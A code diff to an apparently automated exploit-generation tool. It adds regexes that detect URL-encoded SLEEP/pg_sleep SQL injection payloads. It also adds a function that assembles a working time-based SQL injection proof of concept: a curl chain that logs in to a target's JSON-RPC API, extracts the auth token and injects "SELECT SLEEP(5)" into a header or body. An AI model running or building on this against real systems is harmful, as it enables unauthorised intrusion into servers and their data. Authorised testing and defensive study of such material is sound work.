@@ -15300,6 +15300,11 @@ def _timing_payload_scale(command, delta=7):
     for pat_name, pat in (
         ("SLEEP",    r"\bSLEEP\s*\(\s*(\d+(?:\.\d+)?)\s*\)"),
         ("pg_sleep", r"\bpg_sleep\s*\(\s*(\d+(?:\.\d+)?)\s*\)"),
+        # URL-ENCODED forms — the payload is often carried in a header/query/body
+        # where '(' and spaces are percent-encoded (SLEEP%28N%29). Only the digit
+        # group is replaced, so the delimiter encoding is preserved on rebuild.
+        ("SLEEP",    r"\bSLEEP\s*(?:%28|\()\s*(?:%20)*(\d+(?:\.\d+)?)"),
+        ("pg_sleep", r"\bpg_sleep\s*(?:%28|\()\s*(?:%20)*(\d+(?:\.\d+)?)"),
     ):
         m = _re.search(pat, command, _re.I)
         if m:
@@ -16504,6 +16509,86 @@ def _spec_injection_probe(base, spec, token, resolved, timeout=25):
                                   "endpoint": spec.get("endpoint", "")})
                 break
     return confirmed
+
+
+def _assemble_confirmed_poc_command(ip, port, product, canary, auth=None):
+    """ENHANCEMENT 1: build the FIRST PoC command from CONFIRMED pieces — the
+    probed injection vector (carrier + endpoint), the resolved object-ids, and
+    the spec's login/action — so the refine loop STARTS from a verified request
+    instead of re-deriving (and drifting away from) it. Returns {command,
+    assertion, origin} or None. jsonrpc transport today; http is analogous.
+
+    Operator ideas #1: 'wire the researched injection vector / building-block
+    facts directly into the FIRST synth command (auto-assemble from confirmed
+    pieces)'."""
+    spec = _probe_spec(product)
+    if not spec:
+        return None
+    tgt = f"{ip}:{port or 80}"
+    # Confirmed injection vector (carrier + where) for this target.
+    carrier = where = None
+    try:
+        with get_db() as c, c.cursor() as cur:
+            cur.execute("SELECT claim_key, claim_value FROM public.confirmed_facts "
+                        "WHERE target=%s AND claim_type='injection_vector' "
+                        "AND status='confirmed' ORDER BY last_checked_at DESC LIMIT 1",
+                        (tgt,))
+            row = cur.fetchone()
+            if row:
+                carrier = row[0]
+                where = (row[1] or "").split(":", 1)[0] if row[1] else "header"
+            # resolved object ids
+            cur.execute("SELECT claim_key, claim_value FROM public.confirmed_facts "
+                        "WHERE target=%s AND claim_type='object_id' AND status='confirmed'",
+                        (tgt,))
+            resolved = {}
+            for ck, cv in cur.fetchall():
+                resolved.setdefault(ck, cv)
+    except Exception:  # noqa: BLE001
+        return None
+    if not carrier:
+        return None
+    ip_probe = spec.get("injection_probe") or {}
+    tmpl = ip_probe.get("payload_template") or "1'-(SELECT SLEEP({N}))-'"
+    payload = tmpl.replace("{N}", "5")
+    # tag the canary as a trailing SQL comment so the stored PoC stays CVE-anchored
+    if canary:
+        payload = payload + f"-- {canary}"
+    if spec.get("transport") != "jsonrpc" or not (auth and auth.get("username")):
+        return None
+    ep = f"http://{ip}:{port or 80}{spec.get('endpoint','/api_jsonrpc.php')}"
+    ct = spec.get("content_type", "application/json-rpc")
+    lg = spec.get("login") or {}
+    uf = (lg.get("user_fields") or ["username"])[0]
+    import json as _json
+    login_body = _json.dumps({"jsonrpc": "2.0", "method": lg.get("method", "user.login"),
+                              "params": {uf: auth["username"],
+                                         lg.get("pass_field", "password"): auth.get("password")},
+                              "id": 1})
+    params = {}
+    for k, v in (ip_probe.get("params") or {}).items():
+        if isinstance(v, str) and v.startswith("{") and v.endswith("}"):
+            kind = v.strip("{}")
+            params[k] = resolved.get(kind, "1")
+        else:
+            params[k] = v
+    # action body uses a shell-substituted auth token
+    action_obj = {"jsonrpc": "2.0", "method": ip_probe.get("method", "script.execute"),
+                  "params": params, "auth": "__TOKEN__", "id": 1}
+    action_body = _json.dumps(action_obj).replace('"__TOKEN__"', '"\'"$TOK"\'"')
+    # header vs body carrier
+    hdr = ""
+    body_inject = action_body
+    if where == "header":
+        hdr = f" -H \"{carrier}: {payload}\""
+    cmd = (f"TOK=$(curl -s {ep} -H 'Content-Type: {ct}' -d '{login_body}' "
+           f"| sed -n 's/.*\"result\":\"\\([a-z0-9]*\\)\".*/\\1/p'); "
+           f"curl -s {ep} -H 'Content-Type: {ct}'{hdr} -d '{body_inject}'")
+    assertion = {"min_seconds": 5, "max_seconds": 30}
+    if canary:
+        assertion["canary"] = canary
+        assertion["cve_anchored"] = True
+    return {"command": cmd, "assertion": assertion, "origin": f"confirmed:{carrier}"}
 
 
 def _enforce_request_contract(command, product, resolved_ids):
